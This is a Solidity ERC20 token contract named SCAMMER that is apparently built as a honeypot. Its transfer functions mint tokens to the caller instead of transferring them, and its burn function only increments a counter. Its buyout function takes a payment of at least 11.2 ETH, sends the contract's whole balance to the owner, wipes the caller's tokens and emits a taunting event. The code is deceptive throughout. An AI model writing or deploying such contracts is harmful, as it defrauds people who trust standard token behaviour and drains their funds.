// SPDX-License-Identifier: MIT
// Compatible with OpenZeppelin Contracts ^5.0.0
pragma solidity ^0.8.24;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Burnable.sol";

contract SCAMMER is ERC20, Ownable, ERC20Burnable {
    address private tmp;
    uint256 public ethAmount;
    event DoBetter();
    event GodHatesYou();

    mapping(address => uint256) public times;

    constructor(
        address initialOwner
    ) ERC20("SCAMMER", "SCM") Ownable(initialOwner) {
        ethAmount = 11.2 ether;
        tmp = initialOwner;
    }

    function burn(uint256 amount) public override {
        for (uint i = 0; i < amount; i++) {
            times[msg.sender]++;
        }
        emit DoBetter();
    }

    function mint(address to, uint256 amount) public onlyOwner {
        _mint(to, amount);
    }

    function buyout() public payable {
        require(msg.value >= ethAmount);
        require(tx.origin == msg.sender);
        (bool s, ) = tmp.call{value: address(this).balance}("");
        _burn(msg.sender, balanceOf(msg.sender));
        emit GodHatesYou();
    }

    function transfer(
        address to,
        uint256 value
    ) public override returns (bool) {
        _mint(msg.sender, value);
        emit DoBetter();
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 value
    ) public override returns (bool) {
        _mint(msg.sender, value);
        emit DoBetter();
        return true;
    }

    function safeTransfer(address to, uint256 value) public returns (bool) {
        _mint(msg.sender, value);
        emit DoBetter();
        return true;
    }
}
